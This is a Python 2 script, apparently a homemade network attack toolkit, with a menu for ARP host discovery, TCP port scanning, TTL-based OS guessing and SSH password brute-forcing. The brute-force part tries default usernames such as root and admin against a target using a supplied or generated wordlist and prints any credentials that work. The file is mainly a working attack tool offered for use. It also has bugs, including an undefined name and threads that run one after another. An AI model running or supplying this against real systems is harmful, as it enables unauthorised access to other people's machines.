#!/usr/bin/python -tt
import socket
from scapy.all import *
import errno
import sys
import paramiko,threading
import string
from itertools import *
from colorama import Fore

flag=0
n=0
flag1=0

self_ip=socket.gethostbyname(socket.gethostname())

def Host_Discovery():
	live_hosts=[]
	a=str(raw_input(Fore.CYAN +"\nEnter network octects (net id) of ip e.g 192.168.10.*: "+Fore.RESET))
	if a=='' or a is None or a.isalpha():
		print Fore.RED+"Enter correct input...!!!"+Fore.RESET
		return
	else:
		print Fore.GREEN + "\n\t\tLive Hosts are....."+Fore.RESET
		ans,unans=arping(a,verbose=False)
		print Fore.GREEN+"\n IP ADDRESS\t\t  MAC ADDRESS\n"+Fore.RESET
		for i in ans:
			print Fore.GREEN+i[0].pdst +'\t\t'+ i[1].src + Fore.RESET
			if i[0].pdst not in live_hosts:
				live_hosts.append(i[0].pdst)
	print Fore.GREEN + "\n%s hosts up..." %len(live_hosts)+Fore.RESET 
	

def tcp_scan():
	default_ports=[22,23,80,111,135,443]
	tcp_ports=[]
	dst_ip=str(raw_input(Fore.CYAN +'\nEnter Target IP: '+Fore.RESET))
	index=0
	if dst_ip is None or dst_ip == '':
		print Fore.RED+"Enter correct input...!!!" +Fore.RESET
		return
	testip=dst_ip.split('.')
	for i in testip:
		if not i.isdigit():
			index=1
			break
	if index==0:
		if getmacbyip(dst_ip) is None:
			print Fore.RED+ '\nHost is Unreachable or Down..!!' +Fore.RESET
			return

	a=str(raw_input( Fore.CYAN +"Enter Ports(separated with spaces and '-' for range: "+Fore.RESET))
	print Fore.GREEN+"\nPorts scanning started...." +Fore.RESET
	
	if a=='' or a.isspace() or a.isalpha():
		for i in default_ports:
			tcp_ports.append(i)
	else:
		raw_ports=a.split(' ')
		for i in raw_ports:
			if i.isdigit():
				tcp_ports.append(int(i))
			if not i.isdigit():
				temp=i.split('-')
				for j in range(0,len(temp)):
					temp[j]=int(temp[j])
				for j in range(temp[0],temp[1]+1):
					tcp_ports.append(j)
	
	#  TCP connect scan...using connect method
	
	filtered=[]
	closed=[]
	opened=[]
	for i in tcp_ports:
		s=socket.socket()
		try:
			s.settimeout(2)
			s.connect((dst_ip,i))
			opened.append(i)
			continue			
		except socket.error ,e:
			if e[0] in [112,113]:
				print Fore.RED+ '%s is NOT REACHABLE or DOWN' % dst_ip +Fore.RESET
				return
			elif e[0]==111:
				closed.append(i)
			elif socket.timeout:
				filtered.append(i)
		s.close()
	
	if len(opened) > 0:
		print Fore.GREEN+"\nPORT\tSTATUS"+Fore.RESET
		for i in opened:
			print Fore.GREEN+"%s\tOPEN" %i + Fore.RESET
		print Fore.GREEN+"\n%s opened ports..." % len(opened) +Fore.RESET
	if len(filtered) > 0:
		print Fore.YELLOW+"\nPORT\tSTATUS"+Fore.RESET
		for i in filtered:
			if i in default_ports:
				print Fore.YELLOW+'%s\tFILTERED' %i +Fore.RESET
		print Fore.YELLOW+"\n%s filtered ports..." % len(filtered) +Fore.RESET
	if len(closed) > 0:
		print Fore.RED+"\nPORT\tSTATUS"+Fore.RESET
		for i in closed:
			if i in default_ports:
				print Fore.RED+"%s\tCLOSED" %i +Fore.RESET
		print Fore.RED+"\n%s closed ports..." % len(closed) +Fore.RESET
	print Fore.GREEN+"\nScanning completed... %s ports scanned..." % len(tcp_ports) +Fore.RESET

def OS_Detection():
	targetip=str(raw_input( Fore.CYAN +"\nEnter Target IP: " +Fore.RESET))
	print ''
	if targetip == '' or targetip is None:
		print Fore.RED+"Enter correct input...!!!"+Fore.RESET
	if targetip==self_ip:
		print Fore.GREEN+EX+"%s belongs to Linux family..." % targetip + Fore.RESET
		return
	ans,unans=arping(targetip,timeout=2,verbose=False)
	ip=IP()
	ip.dst=targetip
	icmp=ICMP()
	icmp.type=8
	icmp.code=0
	z=sr1(ip/icmp,timeout=10,verbose=False)
	if z is None and len(ans)==1:
		print Fore.YELLOW+"Host is up...but seems to be filtered..." + Fore.RESET		
	elif z is None and len(ans)==0:
		print Fore.RED+"Host is unreachable..."+Fore.RESET
	else:
		if z.ttl==128:
			print Fore.GREEN+"%s belongs to Windows family..." % targetip + Fore.RESET
		elif z.ttl==64:
			print Fore.GREEN+"%s belongs to Linux family..." % targetip + Fore.RESET
		elif z.ttl==56:
			print Fore.GREEN+"%s belongs to Mac family..."% targetip + Fore.RESET
		else:
			print Fore.GREEN+"Unknown OS..." + Fore.RESET

def Brute_Force():
	global flag1
	ip=str(raw_input( Fore.CYAN +"Enter ip: " + Fore.RESET ))
	useroption=str(raw_input( Fore.CYAN +"Known User??(Enter y or n): "+Fore.RESET))
	passwdoption=str(raw_input( Fore.CYAN +"Known Dictionary??(Enter y or n): "+Fore.RESET))
	
	if useroption =='y' and passwdoption =='y':
		username=str(raw_input( Fore.CYAN +"Enter known username: "+Fore.RESET))
		filename=str(raw_input( Fore.CYAN +"Enter password file: "+Fore.RESET))
		ready_Dict(ip,username,filename)
	
	
	elif useroption == 'n' and passwdoption == 'y':
		usernames=["root","admin","administrator","god","webmaster","webadmin",
			"godfather","ditiss","tiger","matriux","hackit","ghost"]
		filename=str(raw_input( Fore.CYAN +"Enter password file: " ))
		for username in usernames:
			if flag1 == 0:
				bt=threading.Thread(ready_Dict(ip,username,filename))
				bt.start()
			else:
				flag1=0
				return
			
	
	elif useroption == 'y' and passwdoption == 'n':
		username=str(raw_input( Fore.CYAN +"Enter known username: "+Fore.RESET))
		Gen_Dict()
		ready_Dict(ip,username,"tempwlist")
	
	elif useroption =='n' and passwdoption =='n':
		usernames=["root","admin","administrator","god","webmaster","webadmin",
			"godfather","ditiss","tiger","matriux","hackit","ghost"]
		Gen_Dict()
		for username in usernames:
			if flag1 == 0:
				bt1=threading.Thread(ready_Dict(ip,username,"tempwlist"))
				bt1.start()
			else:
				flag1=0
				return

def Brute_Thread(ip,username,passwd):
	ssh=paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	global n,flag,flag1
	n=n+1
	try:
		ssh.connect(ip,username=username,password=passwd)
	except paramiko.AuthenticationException:
		print Fore.RED+"[-]Username: %s\tPassword: %s failed."%(username,passwd) + Fore.RESET
	else:
		print Fore.GREEN+"\n********************************************************"		
		print "[#]Username: %s\tPassword: %s Found........!!!"%(username,passwd)
		print "********************************************************"+Fore.RESET
		flag=1
		flag1=1
		print Fore.RED+"\nFound correct password after %s attempts..." %n  +Fore.RESET
		return
	ssh.close()
	return

def ready_Dict(ip,username,filename):
	global flag,n
	f=open(filename,"r")
	st=f.read()
	wordlist=st.split('\n')
	for i in wordlist:
		if flag==0:
			t=threading.Thread(Brute_Thread(ip,username,i))
			t.start()
		elif flag==1:
			flag=0
			break
	if flag==1:
		print Fore.RED+"\nFinished wordlist...%s words checked...password not found!!!" % n+Fore.RESET
	n=0
	f.close()

def Gen_Dict():
	ch=str(raw_input( Fore.CYAN +"Want to enter custom charset??(Enter y or n): "+Fore.RESET))
	if ch == 'y':
		charset=str(raw_input( Fore.CYAN +"Enter custom charset: "+Fore.RESET))
	elif ch == 'n':
		charset=string.letters[0:26]
	min_length=int(input( Fore.CYAN +"Enter min passwd length: "+Fore.RESET))
	max_length=int(input( Fore.CYAN +"Enter max passwd length: "+Fore.RESET))
	f=open("tempwlist","w")
	count=0
	for wordlen in range(min_length,max_length+1):
		for word in listwords(charset,wordlen):
			f.write(word+'\n')
			count+=1
	print Fore.GREEN+"\nDictionary created with %s words....\n" %count + Fore.RESET
	f.close()

def listwords(chars,length):
	for letters in product(chars,repeat=length):
		yield ''.join(letters)

			
def main():
	print Fore.GREEN + " ####     ##		    ##########      					"
	print " ## ##    ## ##### #######          ##     ##     #####  #####  ##### #####	"
	print " ##  ##   ## #        #           ##      #  #    #    # #    # #     #    #	"
	print " ##   ##  ## ####     #    ##   ##       ######   #####  #####  ###   #####	"
	print " ##    ## ## #        #       ##        #      #  #      #      #     # #  	"
	print " ##     #### #####    #      ######### #        # #      #      ##### #  ##	"  + Fore.RESET
	while(True):
		try:	
			print Fore.CYAN + "\n1.Hosts Discovery" +Fore.RESET
			print Fore.CYAN + "2.Ports Scanning" +Fore.RESET
			print Fore.CYAN+"3.OS Detection" + Fore.RESET
			print Fore.CYAN+"4.Brute Force SSH" +Fore.RESET
			print Fore.YELLOW+"Press ctrl+c to exit..." +Fore.RESET
			opt=int(input(Fore.CYAN+"\nEnter choice: "+Fore.RESET))
			if opt==1:
				Host_Discovery()
			elif opt==2:
				tcp_scan()
			elif opt==3:
				OS_Detection()	
			elif opt==4:
				Brute_Force()
			else:
				print Fore.RED+"\nEnter correct choice...!!" +Fore.RESET
		except KeyboardInterrupt:
			print Fore.RED+"\nABORTED PROGRAM....!!" +Fore.RESET
			sys.exit(0)
		except:
			print Fore.RED+"\nEnter correct choice...!!" +Fore.RESET
	
if __name__ == '__main__':
	main()
